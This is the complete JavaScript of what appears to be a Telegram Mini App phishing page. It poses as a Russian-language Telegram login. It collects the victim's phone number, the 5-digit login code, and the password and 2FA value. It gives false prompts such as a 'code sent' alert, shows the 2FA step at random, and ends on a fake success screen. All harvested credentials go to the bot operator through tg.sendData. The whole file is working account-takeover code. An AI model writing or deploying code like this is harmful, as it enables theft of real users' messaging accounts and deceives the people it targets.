let tg = window.Telegram.WebApp;
tg.expand();

let currentStep = 1;
let userData = {};

function showStep(step) {
    document.querySelectorAll('#step1, #step2, #step3, #loading, #success, #error')
        .forEach(el => el.style.display = 'none');
    
    document.getElementById(`step${step}`).style.display = 'block';
    currentStep = step;
}

function requestCode() {
    const phone = document.getElementById('phone').value;
    
    if (!phone || phone.length < 10) {
        alert('Введите корректный номер телефона');
        return;
    }
    
    userData.phone = '+7' + phone;
    showStep(2);
    
    setTimeout(() => {
        alert('✅ Код отправлен! Проверьте Telegram.');
    }, 500);
}

function checkAuth() {
    const code = document.getElementById('code').value;
    
    if (!code || code.length !== 5) {
        alert('Введите 5-значный код');
        return;
    }
    
    userData.code = code;
    
    showStep('loading');
    
    setTimeout(() => {
        if (Math.random() < 0.2) {
            showStep(3);
        } else {
            submitData();
        }
    }, 1500);
}

function submit2FA() {
    const password = document.getElementById('password').value;
    const twofa = document.getElementById('twofa').value;
    
    if (password) userData.password = password;
    if (twofa) userData.twofa = twofa;
    
    submitData();
}

function submitData() {
    showStep('loading');
    
    setTimeout(() => {
        tg.sendData(JSON.stringify(userData));
        
        setTimeout(() => {
            showStep('success');
        }, 2000);
        
    }, 2000);
}
